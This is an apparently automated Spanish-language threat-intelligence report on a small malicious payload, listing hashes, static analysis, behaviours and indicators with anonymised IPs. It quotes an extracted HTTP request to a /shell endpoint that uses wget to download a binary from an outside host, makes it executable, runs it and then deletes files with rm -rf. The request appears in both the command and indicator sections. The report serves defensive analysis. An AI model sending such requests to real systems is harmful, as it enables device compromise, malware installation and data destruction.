# 🧬 Payload Analysis

`ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:00:23+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677`
- **SHA1:** `46a8f381faa18d37d91fbea81694629f86b1bd51`
- **MD5:** `836ffa0eab29ed97fd6af37037a6f726`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 409 B |
| Entropía | 5.41 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+narz;wget+http:/\/93.115.101.XXX:13734/narz;chmod+777+narz;./narz;rm+-rf+* HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 93.115.101.XXX | static_analysis |
| hash | ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677 | static_analysis |
| command | GET /shell?cd+/tmp;rm+narz;wget+http:/\/93.115.101.XXX:13734/narz;chmod+777+narz;./narz;rm+-rf+* HTTP/1.1 | strings |
| ip | 138.197.41.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
